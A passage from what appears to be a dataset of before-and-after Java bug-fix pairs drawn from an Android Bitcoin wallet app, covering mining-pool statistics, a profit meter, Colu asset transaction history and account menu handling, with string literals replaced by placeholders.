    if (paidTransactions != null) {
      for (      List<String> thx : paidTransactions.values()) {
        accruedIncome+=Long.parseLong(thx.get(0));
      }
    }
  }
 catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  PoolStatisticInfo info=new PoolStatisticInfo(totalRmcHashrate,yourRmcHashrate);
  BitcoinNetworkStats stats=getBitcoinNetworkStats();
  if (stats != null) {
    info.difficulty=stats.difficulty;
  }
  info.accruedIncome=accruedIncome;
  return info;
}","public PoolStatisticInfo getStatistics(){
  StatRmcService service=StatRmcFactory.getService();
  long totalRmcHashrate=-1;
  try {
    totalRmcHashrate=service.getCommonHashrate();
  }
 catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  String address=coluAccount.getAddress().toString();
  long yourRmcHashrate=-1;
  try {
    yourRmcHashrate=service.getHashrate(address);
  }
 catch (  RetrofitError e) {
    if (e.getResponse() != null && e.getResponse().getStatus() == 404) {
      yourRmcHashrate=0;
    }
 else {
      Log.e(TAG,""String_Node_Str"",e);
    }
  }
catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  long accruedIncome=-1;
  try {
    accruedIncome=service.getBalance(address);
  }
 catch (  RetrofitError e) {
    if (e.getResponse() != null && e.getResponse().getStatus() == 404) {
      accruedIncome=0;
    }
 else {
      Log.e(TAG,""String_Node_Str"",e);
    }
  }
catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  try {
    Map<String,List<String>> paidTransactions=service.getPaidTransactions(address);
    if (paidTransactions != null) {
      for (      List<String> thx : paidTransactions.values()) {
        accruedIncome+=Long.parseLong(thx.get(0));
      }
    }
  }
 catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  PoolStatisticInfo info=new PoolStatisticInfo(totalRmcHashrate,yourRmcHashrate);
  BitcoinNetworkStats stats=getBitcoinNetworkStats();
  if (stats != null) {
    info.difficulty=stats.difficulty;
  }
  info.accruedIncome=accruedIncome;
  return info;
}"
91134,"public ProfitMeterHolder(View view){
  ButterKnife.bind(this,view);
  BigDecimal rmc=coluAccount.getCurrencyBasedBalance().confirmed.getExactValue().getValue();
  String[] split=rmc.setScale(4,BigDecimal.ROUND_DOWN).toPlainString().split(""String_Node_Str"");
  rmcValue.setText(split[0]);
  rmcValueAfterDot.setText(""String_Node_Str"" + split[1]);
  if (poolStatisticInfo != null && poolStatisticInfo.yourRmcHashrate != 0 && poolStatisticInfo.difficulty != 0) {
    satPerSec=BigDecimal.valueOf(poolStatisticInfo.yourRmcHashrate).multiply(BLOCK_REWARD).divide(BigDecimal.valueOf(poolStatisticInfo.difficulty).multiply(POW_2_32),4,BigDecimal.ROUND_UP);
    speed.setText(context.getString(R.string.n_sat_min,(long)(satPerSec.floatValue() * 60)));
    accruedValue.setText(accrued.stripTrailingZeros().toPlainString() + ""String_Node_Str"");
    if (updateAdo == null) {
      updateAdo=new Runnable(){
        @Override public void run(){
          angle=(angle + 6) % 360;
          if (angle == 0) {
            accrued=accrued.add(BigDecimal.valueOf(value).movePointLeft(8)).setScale(8,BigDecimal.ROUND_UP);
            sharedPreferences.edit().putString(ACCRUED_INCOME + coluAccount.getAddress().toString(),accrued.toPlainString()).apply();
            accruedValue.setText(accrued.stripTrailingZeros().toPlainString() + ""String_Node_Str"");
            value=0;
          }
 else {
            value+=satPerSec.floatValue();
          }
          adometr.setText(""String_Node_Str"" + (Math.round(value) > 0 ? String.valueOf(Math.round(value)) : adoFormat.format(value)));
          profitMeterView.setAngle(angle);
          profitMeterView.postDelayed(this,1000);
        }
      }
;
      updateAdo.run();
    }
  }
}","public ProfitMeterHolder(View view){
  ButterKnife.bind(this,view);
  if (coluAccount == null) {
    return;
  }
  BigDecimal rmc=coluAccount.getCurrencyBasedBalance().confirmed.getExactValue().getValue();
  String[] split=rmc.setScale(4,BigDecimal.ROUND_DOWN).toPlainString().split(""String_Node_Str"");
  rmcValue.setText(split[0]);
  rmcValueAfterDot.setText(""String_Node_Str"" + split[1]);
  if (poolStatisticInfo != null && poolStatisticInfo.yourRmcHashrate != 0 && poolStatisticInfo.difficulty != 0) {
    satPerSec=BigDecimal.valueOf(poolStatisticInfo.yourRmcHashrate).multiply(BLOCK_REWARD).divide(BigDecimal.valueOf(poolStatisticInfo.difficulty).multiply(POW_2_32),4,BigDecimal.ROUND_UP);
    long adotime=sharedPreferences.getLong(ADOTIME + coluAccount.getAddress().toString(),0);
    if (adotime != 0) {
      angle=(int)(sharedPreferences.getInt(ADOANGLE + coluAccount.getAddress().toString(),0) + 6 * (System.currentTimeMillis() - adotime) / 1000);
      value=angle / 6 * satPerSec.floatValue();
    }
    speed.setText(context.getString(R.string.n_sat_min,(long)(satPerSec.floatValue() * 60)));
    accruedValue.setText(accrued.stripTrailingZeros().toPlainString() + ""String_Node_Str"");
    if (updateAdo == null) {
      updateAdo=new Runnable(){
        @Override public void run(){
          angle=(angle + 6) % 360;
          SharedPreferences.Editor editor=sharedPreferences.edit();
          if (angle == 0) {
            accrued=accrued.add(BigDecimal.valueOf(value).movePointLeft(8)).setScale(8,BigDecimal.ROUND_UP);
            editor.putString(ACCRUED_INCOME + coluAccount.getAddress().toString(),accrued.toPlainString());
            accruedValue.setText(accrued.stripTrailingZeros().toPlainString() + ""String_Node_Str"");
            value=0;
          }
 else {
            value+=satPerSec.floatValue();
          }
          editor.putLong(ADOTIME + coluAccount.getAddress().toString(),System.currentTimeMillis());
          editor.putInt(ADOANGLE + coluAccount.getAddress().toString(),angle);
          editor.apply();
          adometr.setText(""String_Node_Str"" + (Math.round(value) > 0 ? String.valueOf(Math.round(value)) : adoFormat.format(value)));
          profitMeterView.setAngle(angle);
          profitMeterView.postDelayed(this,1000);
        }
      }
;
      updateAdo.run();
    }
  }
}"
91135,"@Override public void run(){
  angle=(angle + 6) % 360;
  if (angle == 0) {
    accrued=accrued.add(BigDecimal.valueOf(value).movePointLeft(8)).setScale(8,BigDecimal.ROUND_UP);
    sharedPreferences.edit().putString(ACCRUED_INCOME + coluAccount.getAddress().toString(),accrued.toPlainString()).apply();
    accruedValue.setText(accrued.stripTrailingZeros().toPlainString() + ""String_Node_Str"");
    value=0;
  }
 else {
    value+=satPerSec.floatValue();
  }
  adometr.setText(""String_Node_Str"" + (Math.round(value) > 0 ? String.valueOf(Math.round(value)) : adoFormat.format(value)));
  profitMeterView.setAngle(angle);
  profitMeterView.postDelayed(this,1000);
}","@Override public void run(){
  angle=(angle + 6) % 360;
  SharedPreferences.Editor editor=sharedPreferences.edit();
  if (angle == 0) {
    accrued=accrued.add(BigDecimal.valueOf(value).movePointLeft(8)).setScale(8,BigDecimal.ROUND_UP);
    editor.putString(ACCRUED_INCOME + coluAccount.getAddress().toString(),accrued.toPlainString());
    accruedValue.setText(accrued.stripTrailingZeros().toPlainString() + ""String_Node_Str"");
    value=0;
  }
 else {
    value+=satPerSec.floatValue();
  }
  editor.putLong(ADOTIME + coluAccount.getAddress().toString(),System.currentTimeMillis());
  editor.putInt(ADOANGLE + coluAccount.getAddress().toString(),angle);
  editor.apply();
  adometr.setText(""String_Node_Str"" + (Math.round(value) > 0 ? String.valueOf(Math.round(value)) : adoFormat.format(value)));
  profitMeterView.setAngle(angle);
  profitMeterView.postDelayed(this,1000);
}"
91136,"public AddressWidgetAdapter(Context context,MbwManager mbwManager){
  this.context=context;
  this.mbwManager=mbwManager;
  sharedPreferences=context.getSharedPreferences(PREFERENCE_RMC_PROFIT_METER,Context.MODE_PRIVATE);
  coluAccount=(ColuAccount)mbwManager.getSelectedAccount();
  poolStatisticInfo=new BtcPoolStatisticsManager.PoolStatisticInfo(sharedPreferences.getLong(TOTAL_RMC_HASHRATE,0),sharedPreferences.getLong(YOUR_RMC_HASHRATE + coluAccount.getAddress().toString(),0));
  poolStatisticInfo.difficulty=sharedPreferences.getLong(DIFFICULTY,0);
  accrued=new BigDecimal(sharedPreferences.getString(ACCRUED_INCOME + coluAccount.getAddress().toString(),""String_Node_Str""));
  BtcPoolStatisticsTask task=new BtcPoolStatisticsTask(coluAccount);
  task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
}","public AddressWidgetAdapter(Context context,MbwManager mbwManager){
  this.context=context;
  this.mbwManager=mbwManager;
  sharedPreferences=context.getSharedPreferences(PREFERENCE_RMC_PROFIT_METER,Context.MODE_PRIVATE);
  WalletAccount account=mbwManager.getSelectedAccount();
  if (account instanceof ColuAccount) {
    coluAccount=(ColuAccount)mbwManager.getSelectedAccount();
    poolStatisticInfo=new BtcPoolStatisticsManager.PoolStatisticInfo(sharedPreferences.getLong(TOTAL_RMC_HASHRATE,0),sharedPreferences.getLong(YOUR_RMC_HASHRATE + coluAccount.getAddress().toString(),0));
    poolStatisticInfo.difficulty=sharedPreferences.getLong(DIFFICULTY,0);
    accrued=new BigDecimal(sharedPreferences.getString(ACCRUED_INCOME + coluAccount.getAddress().toString(),""String_Node_Str""));
    BtcPoolStatisticsTask task=new BtcPoolStatisticsTask(coluAccount);
    task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
  }
}"
91137,"@Override public List<TransactionSummary> getTransactionHistory(int offset,int limit){
  if (historyTxList != null) {
    List<TransactionSummary> list=getTransactionSummaries();
    ArrayList<TransactionSummary> result=new ArrayList<>();
    for (    TransactionSummary transactionSummary : list) {
      if (transactionSummary.value.getCurrency().equals(coluAsset.name)) {
        result.add(transactionSummary);
      }
    }
    return limitedList(offset,limit,result);
  }
 else {
    return Lists.newArrayList();
  }
}","@Override public List<TransactionSummary> getTransactionHistory(int offset,int limit){
  if (historyTxList != null) {
    List<TransactionSummary> list=new ArrayList<>(getTransactionSummaries());
    ArrayList<TransactionSummary> result=new ArrayList<>();
    for (    TransactionSummary transactionSummary : list) {
      if (transactionSummary != null && transactionSummary.value.getCurrency().equals(coluAsset.name)) {
        result.add(transactionSummary);
      }
    }
    return limitedList(offset,limit,result);
  }
 else {
    return Lists.newArrayList();
  }
}"
91138,"private List<TransactionSummary> getTransactionSummaries(){
  allTransactionSummaries=new ArrayList<>();
  for (  Tx.Json tx : historyTxList) {
    Sha256Hash hash=new Sha256Hash(Hex.decode(tx.txid));
    TransactionExApi extendedInfo=null;
    if (historyTxInfosList != null) {
      for (      TransactionExApi tex : historyTxInfosList) {
        if (tex.txid.compareTo(hash) == 0) {
          extendedInfo=tex;
          Log.d(TAG,""String_Node_Str"" + hash);
          break;
        }
      }
    }
 else {
      Log.d(TAG,""String_Node_Str"");
    }
    if (extendedInfo == null) {
      Log.d(TAG,""String_Node_Str"" + hash + ""String_Node_Str"");
    }
    long outgoingAsset=0;
    long outgoingSatoshi=0;
    for (    Vin.Json vin : tx.vin) {
      if (vin.assets.size() > 0) {
        if (vin.previousOutput.addresses != null && vin.previousOutput.addresses.contains(this.address.toString())) {
          for (          Asset.Json anAsset : vin.assets) {
            if (anAsset.assetId.contentEquals(coluAsset.id)) {
              outgoingAsset=outgoingAsset + anAsset.amount;
            }
          }
        }
      }
 else {
        if (vin.previousOutput.addresses != null && vin.previousOutput.addresses.contains(this.address.toString())) {
          outgoingSatoshi+=vin.value;
        }
      }
    }
    Log.d(TAG,""String_Node_Str"" + outgoingAsset);
    Log.d(TAG,""String_Node_Str"" + outgoingSatoshi);
    long incomingAsset=0;
    long incomingSatoshi=0;
    List<Address> toAddresses=new ArrayList<>();
    Optional<Address> destinationAddress=null;
    for (    Vout.Json vout : tx.vout) {
      if (vout.scriptPubKey.addresses != null) {
        for (        String address : vout.scriptPubKey.addresses) {
          toAddresses.add(Address.fromString(address));
        }
        if (vout.scriptPubKey.addresses.size() > 0) {
          Address address=Address.fromString(vout.scriptPubKey.addresses.get(0));
          if (!isMine(address)) {
            destinationAddress=Optional.fromNullable(address);
          }
        }
      }
      if (vout.assets.size() > 0) {
        if (vout.scriptPubKey.addresses != null && vout.scriptPubKey.addresses.contains(this.address.toString())) {
          for (          Asset.Json anAsset : vout.assets) {
            if (anAsset.assetId.contentEquals(coluAsset.id)) {
              incomingAsset=incomingAsset + anAsset.amount;
            }
          }
          break;
        }
      }
 else {
        if (vout.scriptPubKey.addresses != null && vout.scriptPubKey.addresses.contains(this.address.toString())) {
          incomingSatoshi+=vout.value;
        }
      }
    }
    BigDecimal valueBigDecimal;
    ExactCurrencyValue value;
    long assetBalance=incomingAsset - outgoingAsset;
    long satoshiBalance=incomingSatoshi - outgoingSatoshi;
    boolean isIncoming;
    if (assetBalance != 0) {
      isIncoming=assetBalance > 0;
      valueBigDecimal=BigDecimal.valueOf(Math.abs(assetBalance),coluAsset.scale);
      value=ExactCurrencyValue.from(valueBigDecimal,coluAsset.name);
    }
 else     if (satoshiBalance != 0) {
      isIncoming=satoshiBalance > 0;
      valueBigDecimal=BigDecimal.valueOf(Math.abs(satoshiBalance),8);
      value=ExactCurrencyValue.from(valueBigDecimal,""String_Node_Str"");
    }
 else {
      continue;
    }
    long time=0;
    int height=(int)tx.blockheight;
    boolean isQueuedOutgoing=false;
    if (extendedInfo != null) {
      time=extendedInfo.time;
    }
 else {
      time=new Date().getTime();
    }
    int confirmations=tx.confirmations;
    if (destinationAddress == null) {
      destinationAddress=Optional.absent();
    }
    if (destinationAddress != null && destinationAddress.isPresent()) {
      Log.d(TAG,""String_Node_Str"" + hash + ""String_Node_Str""+ time+ ""String_Node_Str""+ height+ ""String_Node_Str""+ confirmations+ ""String_Node_Str""+ destinationAddress.get().toString());
    }
 else {
      Log.d(TAG,""String_Node_Str"" + hash + ""String_Node_Str""+ time+ ""String_Node_Str""+ height+ ""String_Node_Str""+ confirmations);
    }
    TransactionSummary summary=new TransactionSummary(hash,value,isIncoming,time,height,confirmations,isQueuedOutgoing,null,destinationAddress,toAddresses);
    allTransactionSummaries.add(summary);
  }
  Log.d(TAG,""String_Node_Str"" + allTransactionSummaries.size() + ""String_Node_Str"");
  Collections.sort(allTransactionSummaries,new Comparator<TransactionSummary>(){
    public int compare(    TransactionSummary p1,    TransactionSummary p2){
      return (int)(p2.time - p1.time);
    }
  }
);
  return allTransactionSummaries;
}","private List<TransactionSummary> getTransactionSummaries(){
  allTransactionSummaries=new ArrayList<>();
  for (  Tx.Json tx : historyTxList) {
    Sha256Hash hash=new Sha256Hash(Hex.decode(tx.txid));
    TransactionExApi extendedInfo=null;
    if (historyTxInfosList != null) {
      for (      TransactionExApi tex : historyTxInfosList) {
        if (tex.txid.compareTo(hash) == 0) {
          extendedInfo=tex;
          Log.d(TAG,""String_Node_Str"" + hash);
          break;
        }
      }
    }
 else {
      Log.d(TAG,""String_Node_Str"");
    }
    if (extendedInfo == null) {
      Log.d(TAG,""String_Node_Str"" + hash + ""String_Node_Str"");
    }
    long outgoingAsset=0;
    long outgoingSatoshi=0;
    for (    Vin.Json vin : tx.vin) {
      if (vin.assets.size() > 0) {
        if (vin.previousOutput.addresses != null && vin.previousOutput.addresses.contains(this.address.toString())) {
          for (          Asset.Json anAsset : vin.assets) {
            if (anAsset.assetId.contentEquals(coluAsset.id)) {
              outgoingAsset=outgoingAsset + anAsset.amount;
            }
          }
        }
      }
 else {
        if (vin.previousOutput.addresses != null && vin.previousOutput.addresses.contains(this.address.toString())) {
          outgoingSatoshi+=vin.value;
        }
      }
    }
    Log.d(TAG,""String_Node_Str"" + outgoingAsset);
    Log.d(TAG,""String_Node_Str"" + outgoingSatoshi);
    long incomingAsset=0;
    long incomingSatoshi=0;
    List<Address> toAddresses=new ArrayList<>();
    Optional<Address> destinationAddress=null;
    for (    Vout.Json vout : tx.vout) {
      if (vout.scriptPubKey.addresses != null) {
        for (        String address : vout.scriptPubKey.addresses) {
          toAddresses.add(Address.fromString(address));
        }
        if (vout.scriptPubKey.addresses.size() > 0) {
          Address address=Address.fromString(vout.scriptPubKey.addresses.get(0));
          if (!isMine(address)) {
            destinationAddress=Optional.fromNullable(address);
          }
        }
      }
      if (vout.assets.size() > 0) {
        if (vout.scriptPubKey.addresses != null && vout.scriptPubKey.addresses.contains(this.address.toString())) {
          for (          Asset.Json anAsset : vout.assets) {
            if (anAsset.assetId.contentEquals(coluAsset.id)) {
              incomingAsset=incomingAsset + anAsset.amount;
            }
          }
          break;
        }
      }
 else {
        if (vout.scriptPubKey.addresses != null && vout.scriptPubKey.addresses.contains(this.address.toString())) {
          incomingSatoshi+=vout.value;
        }
      }
    }
    BigDecimal valueBigDecimal;
    ExactCurrencyValue value;
    long assetBalance=incomingAsset - outgoingAsset;
    long satoshiBalance=incomingSatoshi - outgoingSatoshi;
    boolean isIncoming;
    if (assetBalance != 0) {
      isIncoming=assetBalance > 0;
      valueBigDecimal=BigDecimal.valueOf(Math.abs(assetBalance),coluAsset.scale);
      value=ExactCurrencyValue.from(valueBigDecimal,coluAsset.name);
    }
 else     if (satoshiBalance != 0) {
      isIncoming=satoshiBalance > 0;
      valueBigDecimal=BigDecimal.valueOf(Math.abs(satoshiBalance),8);
      value=ExactCurrencyValue.from(valueBigDecimal,""String_Node_Str"");
    }
 else {
      continue;
    }
    long time=0;
    int height=(int)tx.blockheight;
    boolean isQueuedOutgoing=false;
    if (extendedInfo != null) {
      time=extendedInfo.time;
    }
 else {
      time=new Date().getTime();
    }
    int confirmations=tx.confirmations;
    if (destinationAddress == null) {
      destinationAddress=Optional.absent();
    }
    if (destinationAddress != null && destinationAddress.isPresent()) {
      Log.d(TAG,""String_Node_Str"" + hash + ""String_Node_Str""+ time+ ""String_Node_Str""+ height+ ""String_Node_Str""+ confirmations+ ""String_Node_Str""+ destinationAddress.get().toString());
    }
 else {
      Log.d(TAG,""String_Node_Str"" + hash + ""String_Node_Str""+ time+ ""String_Node_Str""+ height+ ""String_Node_Str""+ confirmations);
    }
    TransactionSummary summary=new TransactionSummary(hash,value,isIncoming,time,height,confirmations,isQueuedOutgoing,null,destinationAddress,toAddresses);
    allTransactionSummaries.add(summary);
  }
  Log.d(TAG,""String_Node_Str"" + allTransactionSummaries.size() + ""String_Node_Str"");
  Collections.sort(allTransactionSummaries,new Comparator<TransactionSummary>(){
    public int compare(    TransactionSummary p1,    TransactionSummary p2){
      if (p2 == null) {
        return -1;
      }
 else       if (p1 == null) {
        return 1;
      }
 else {
        return (int)(p2.time - p1.time);
      }
    }
  }
);
  return allTransactionSummaries;
}"
91139,"public int compare(TransactionSummary p1,TransactionSummary p2){
  return (int)(p2.time - p1.time);
}","public int compare(TransactionSummary p1,TransactionSummary p2){
  if (p2 == null) {
    return -1;
  }
 else   if (p1 == null) {
    return 1;
  }
 else {
    return (int)(p2.time - p1.time);
  }
}"
91140,"@Override public void onSaveInstanceState(Bundle savedInstanceState){
  super.onSaveInstanceState(savedInstanceState);
  savedInstanceState.putSerializable(""String_Node_Str"",findViewById(R.id.etAddress).toString());
}","@Override public void onSaveInstanceState(Bundle savedInstanceState){
  super.onSaveInstanceState(savedInstanceState);
  savedInstanceState.putSerializable(""String_Node_Str"",((EditText)findViewById(R.id.etAddress)).getText().toString());
}"
91141,"@Override public long computeValue(int position){
  int step=position - minPosition;
  return (long)(minValue * Math.pow(scale,step));
}","@Override public long computeValue(int position){
  int step=position - minPosition;
  return round((double)minValue * pow(scale,step));
}"
91142,"public ExponentialFeeItemsAlgorithm(long minValue,int minPosition,long maxValue,int maxPosition){
  this.minPosition=minPosition;
  this.maxPosition=maxPosition;
  this.minValue=minValue;
  int steps=maxPosition - minPosition;
  scale=Math.exp(Math.log((double)maxValue / (double)minValue) / (double)steps);
}","public ExponentialFeeItemsAlgorithm(long minValue,int minPosition,long maxValue,int maxPosition){
  this.minPosition=minPosition;
  this.maxPosition=maxPosition;
  this.minValue=minValue;
  int steps=maxPosition - minPosition;
  scale=exp(log((double)maxValue / (double)minValue) / (double)steps);
}"
91143,"private void verifySingleKeyBackup(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_focusedAccount instanceof SingleAddressAccount || _focusedAccount instanceof ColuAccount) {
    VerifyBackupActivity.callMe(getActivity());
  }
}","private void verifySingleKeyBackup(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
  if (_focusedAccount instanceof SingleAddressAccount || _focusedAccount instanceof ColuAccount) {
    VerifyBackupActivity.callMe(getActivity());
  }
}"
91144,"@Override public void onDestroyActionMode(ActionMode actionMode){
  currentActionMode=null;
  if (_focusedAccount != null) {
    _focusedAccount=null;
    update();
  }
}","@Override public void onDestroyActionMode(ActionMode actionMode){
  currentActionMode=null;
  if (accountListAdapter.getFocusedAccount() != null) {
    accountListAdapter.setFocusedAccount(null);
    update();
  }
}"
91145,"@Override public void onActivityResult(final int requestCode,final int resultCode,final Intent intent){
  ActivityCompat.invalidateOptionsMenu(getActivity());
  if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddCoinapultAccountActivity.RESULT_COINAPULT) {
    UUID accountId=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    CoinapultAccount account=(CoinapultAccount)_mbwManager.getWalletManager(false).getAccount(accountId);
    _mbwManager.setSelectedAccount(accountId);
    _focusedAccount=account;
    update();
    return;
  }
  if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == Activity.RESULT_OK) {
    UUID accountid=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    WalletAccount account=_mbwManager.getWalletManager(false).getAccount(accountid);
    if (account.isActive()) {
      _mbwManager.setSelectedAccount(accountid);
    }
    _focusedAccount=account;
    update();
    if (!(account instanceof ColuAccount)) {
      setNameForNewAccount(_focusedAccount);
    }
  }
 else   if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddAdvancedAccountActivity.RESULT_MSG) {
    new AlertDialog.Builder(getActivity()).setMessage(intent.getStringExtra(AddAccountActivity.RESULT_MSG)).setPositiveButton(R.string.button_ok,null).create().show();
  }
 else {
    super.onActivityResult(requestCode,resultCode,intent);
  }
}","@Override public void onActivityResult(final int requestCode,final int resultCode,final Intent intent){
  ActivityCompat.invalidateOptionsMenu(getActivity());
  if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddCoinapultAccountActivity.RESULT_COINAPULT) {
    UUID accountId=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    CoinapultAccount account=(CoinapultAccount)_mbwManager.getWalletManager(false).getAccount(accountId);
    _mbwManager.setSelectedAccount(accountId);
    accountListAdapter.setFocusedAccount(account);
    update();
    return;
  }
  if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == Activity.RESULT_OK) {
    UUID accountid=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    WalletAccount account=_mbwManager.getWalletManager(false).getAccount(accountid);
    if (account.isActive()) {
      _mbwManager.setSelectedAccount(accountid);
    }
    accountListAdapter.setFocusedAccount(account);
    update();
    if (!(account instanceof ColuAccount)) {
      setNameForNewAccount(account);
    }
  }
 else   if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddAdvancedAccountActivity.RESULT_MSG) {
    new AlertDialog.Builder(getActivity()).setMessage(intent.getStringExtra(AddAccountActivity.RESULT_MSG)).setPositiveButton(R.string.button_ok,null).create().show();
  }
 else {
    super.onActivityResult(requestCode,resultCode,intent);
  }
}"
91146,"private void makeBackup(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_focusedAccount instanceof ColuAccount) {
    Utils.pinProtectedBackup(getActivity());
  }
 else {
    if (_focusedAccount.isDerivedFromInternalMasterseed()) {
      Utils.pinProtectedWordlistBackup(getActivity());
    }
 else     if (_focusedAccount instanceof SingleAddressAccount) {
      Utils.pinProtectedBackup(getActivity());
    }
  }
}","private void makeBackup(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
  if (_focusedAccount instanceof ColuAccount) {
    Utils.pinProtectedBackup(getActivity());
  }
 else {
    if (_focusedAccount.isDerivedFromInternalMasterseed()) {
      Utils.pinProtectedWordlistBackup(getActivity());
    }
 else     if (_focusedAccount instanceof SingleAddressAccount) {
      Utils.pinProtectedBackup(getActivity());
    }
  }
}"
91147,"private void activateSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      activate(_focusedAccount);
    }
  }
);
}","private void activateSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      activate(accountListAdapter.getFocusedAccount());
    }
  }
);
}"
91148,"private void archiveSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_mbwManager.getWalletManager(false).getActiveAccounts().size() < 2) {
    _toaster.toast(R.string.keep_one_active,false);
    return;
  }
  if (_focusedAccount instanceof CoinapultAccount) {
    _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
      @Override public void run(){
        if (!AccountsFragment.this.isAdded()) {
          return;
        }
        archive(_focusedAccount);
      }
    }
);
    return;
  }
  if (_focusedAccount instanceof Bip44Account) {
    Bip44Account account=(Bip44Account)_focusedAccount;
    if (!account.hasHadActivity()) {
      _toaster.toast(R.string.dont_allow_archiving_unused_notification,false);
      return;
    }
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      archive(_focusedAccount);
    }
  }
);
}","private void archiveSelected(){
  if (!AccountsFragment.this.isAdded()) {
    return;
  }
  if (_mbwManager.getWalletManager(false).getActiveAccounts().size() < 2) {
    _toaster.toast(R.string.keep_one_active,false);
    return;
  }
  final WalletAccount _focusedAccount=accountListAdapter.getFocusedAccount();
  if (_focusedAccount instanceof CoinapultAccount) {
    _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
      @Override public void run(){
        if (!AccountsFragment.this.isAdded()) {
          return;
        }
        archive(_focusedAccount);
      }
    }
);
    return;
  }
  if (_focusedAccount instanceof Bip44Account) {
    Bip44Account account=(Bip44Account)_focusedAccount;
    if (!account.hasHadActivity()) {
      _toaster.toast(R.string.dont_allow_archiving_unused_notification,false);
      return;
    }
  }
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      if (!AccountsFragment.this.isAdded()) {
        return;
      }
      archive(_focusedAccount);
    }
  }
);
}"
91149,"/** 
 * Called when the activity is first created.
 */
@SuppressWarnings(""String_Node_Str"") @Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  View ret=inflater.inflate(R.layout.records_activity,container,false);
  _layoutInflater=inflater;
  _separatorColor=getResources().getColor(R.color.darkgrey);
  _separatorLayoutParameters=new LayoutParams(LayoutParams.FILL_PARENT,getDipValue(1),1);
  _outerLayoutParameters=new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT,1);
  _outerLayoutParameters.bottomMargin=getDipValue(8);
  _innerLayoutParameters=new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT,1);
  return ret;
}","/** 
 * Called when the activity is first created.
 */
@SuppressWarnings(""String_Node_Str"") @Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  return inflater.inflate(R.layout.records_activity,container,false);
}"
91150,"private void updateIncludingMenus(){
  WalletAccount account=_focusedAccount;
  final List<Integer> menus=Lists.newArrayList();
  if (!(account instanceof ColuAccount) && !Utils.checkIsLinked(account,_mbwManager.getColuManager().getAccounts().values())) {
    menus.add(R.menu.record_options_menu);
  }
  if ((account instanceof SingleAddressAccount) || (account.isDerivedFromInternalMasterseed())) {
    menus.add(R.menu.record_options_menu_backup);
  }
  if (account instanceof SingleAddressAccount) {
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (account instanceof ColuAccount) {
    menus.add(R.menu.record_options_menu_backup);
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (!account.isDerivedFromInternalMasterseed()) {
    menus.add(R.menu.record_options_menu_delete);
  }
  if (account.isActive() && account.canSpend() && !(account instanceof Bip44PubOnlyAccount)) {
    menus.add(R.menu.record_options_menu_sign);
  }
  if (account.isActive()) {
    menus.add(R.menu.record_options_menu_active);
  }
  if (account.isActive() && !(account instanceof CoinapultAccount)) {
    menus.add(R.menu.record_options_menu_outputs);
  }
  if (account instanceof CoinapultAccount) {
    menus.add(R.menu.record_options_menu_set_coinapult_mail);
  }
  if (account.isArchived()) {
    menus.add(R.menu.record_options_menu_archive);
  }
  if (account.isActive() && account instanceof ExportableAccount) {
    menus.add(R.menu.record_options_menu_export);
  }
  if (account.isActive() && account instanceof Bip44Account && !(account instanceof Bip44PubOnlyAccount)&& walletManager.getActiveMasterseedAccounts().size() > 1) {
    if (!((Bip44Account)account).hasHadActivity()) {
      menus.add(R.menu.record_options_menu_hide_unused);
    }
  }
  if (RecordRowBuilder.showLegacyAccountWarning(account,_mbwManager)) {
    menus.add(R.menu.record_options_menu_ignore_warning);
  }
  if (account.getId().equals(_mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    menus.add(R.menu.record_options_menu_detach);
  }
  ActionBarActivity parent=(ActionBarActivity)getActivity();
  Callback actionMode=new Callback(){
    @Override public boolean onCreateActionMode(    ActionMode actionMode,    Menu menu){
      for (      Integer res : menus) {
        actionMode.getMenuInflater().inflate(res,menu);
      }
      return true;
    }
    @Override public boolean onPrepareActionMode(    ActionMode actionMode,    Menu menu){
      return true;
    }
    @Override public boolean onActionItemClicked(    ActionMode actionMode,    MenuItem menuItem){
